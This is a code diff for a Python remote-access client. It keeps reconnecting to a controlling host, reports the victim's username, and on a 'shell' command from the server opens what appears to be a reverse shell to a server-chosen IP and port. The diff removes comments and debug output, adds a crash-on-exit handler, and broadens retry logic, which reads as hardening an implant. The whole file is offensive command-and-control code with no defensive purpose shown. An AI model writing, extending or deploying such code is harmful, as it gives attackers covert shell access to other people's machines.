@@ -57,40 +57,36 @@ def main():
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            # Attempt to connect to the server
             print(f"Trying to connect to {host} on port {port}")
             s.connect((host, port))
             print(f"Successfully connected to {host} on port {port}")
 
-            # Send the event name and JSON data
-            s.send(("initialization|" + json.dumps({"username": getpass.getuser()})).encode())  # Convert the string to bytes
+            s.send(("initialization|" + json.dumps({"username": getpass.getuser()})).encode())
 
             while True:
                 try:
-                    # Receive data from the server
                     received_data = s.recv(1024)
                     if received_data:
-                        print(f"Received command: {received_data.decode()}")
-                        # Split the received data into event name and JSON payload
                         event_name, json_payload = received_data.decode().split('|', 1)
-                        print(f"Event Name: {event_name}, Payload: {json_payload}")
-                        # Deserialize the JSON payload
                         command = json.loads(json_payload)
-                        print(f"Main command: {command}")
                         if event_name == 'shell':
                             new_thread = threading.Thread(target=execute_shell, args=(command['ip'], command['port']), daemon=True)
                             new_thread.start()
-                except socket.error as e:
-                    print(f"Error receiving data: {e}")
+                        elif event_name == 'exit':
+                            fuckthisshit = 1/0
+                except Exception as e:
+                    print(f"Error: {e}")
                     break
 
-        except socket.error as e:
-            print(f"Error connecting to server: {e}")
+        except Exception as e:
+            # Check if the error message indicates a network-related issue
+            if "Connection refused" in str(e) or "No route to host" in str(e):
+                print(f"Network error occurred: {e}. Retrying...")
+            else:
+                print(f"Unexpected error: {e}")
+                break
 
-        # Close the connection
         s.close()
-
-        # Wait before trying to reconnect
         time.sleep(5)
 
 if __name__ == "__main__":
